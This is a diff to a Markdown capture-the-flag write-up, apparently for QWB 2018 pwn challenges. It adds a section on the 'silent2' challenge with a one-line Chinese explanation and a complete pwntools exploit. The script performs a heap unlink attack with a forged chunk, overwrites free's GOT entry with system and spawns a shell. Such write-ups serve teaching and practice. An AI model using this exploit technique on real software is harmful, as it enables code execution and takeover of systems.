@@ -92,9 +92,74 @@ s.interactive()
 ```
 
 
-## 0x001 silent2
+## 0x002 silent2(unlink)
+
+跟silent一样，只是限制不能malloc fastbin，可以利用unlink
+![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x002-001.png)
+
+```
+#!/usr/bin/env python2
+## -*- coding: utf-8 -*- #
+from pwn import *
+context.arch = 'amd64'
+context.log_level='debug'
+
+s = process("./silent2")
+elf = ELF("./silent2")
+
+def add(l,con):
+	sleep(0.2)
+	s.sendline("1")
+	sleep(0.2)
+	s.sendline(str(l))
+	sleep(0.2)
+	s.send(con)
+
+def delete(idx):
+	sleep(0.2)
+	s.sendline("2")
+	sleep(0.2)
+	s.sendline(str(idx))
+
+def edit(idx,con):
+	sleep(0.2)
+	s.sendline("3")
+	sleep(0.2)
+	s.sendline(str(idx))
+	sleep(0.2)
+	s.send(con)
 
 
+add(0x80,"AAAA".ljust(0x7f,'A'))
+add(0x80,"AAAA".ljust(0x7f,'A'))
+add(0x80,"AAAA".ljust(0x7f,'A'))
+add(0x80,"AAAA".ljust(0x7f,'A'))
+add(0x80,"AAAA".ljust(0x7f,'A'))
+add(0x80,"/bin/sh\x00")
+delete(3)
+delete(4)
+
+free_got = elf.got["free"]
+system_plt = elf.plt["system"]
+
+fake_addr = 0x6020c0+3*8
+fake_chunk = ""
+fake_chunk += p64(0)
+fake_chunk += p64(0x81)
+fake_chunk += p64(fake_addr-3*8)
+fake_chunk += p64(fake_addr-2*8)
+fake_chunk += "".ljust(0x80-4*8, 'A')
+fake_chunk += p64(0x80)
+fake_chunk += p64(0x80+0x10)
+
+add(0x80+0x10+0x80,fake_chunk)
+delete(4)
+edit(3,p64(free_got))
+edit(0,p64(system_plt))
+delete(5)
+
+s.interactive()
+```
 
 
 ## 0x003 core
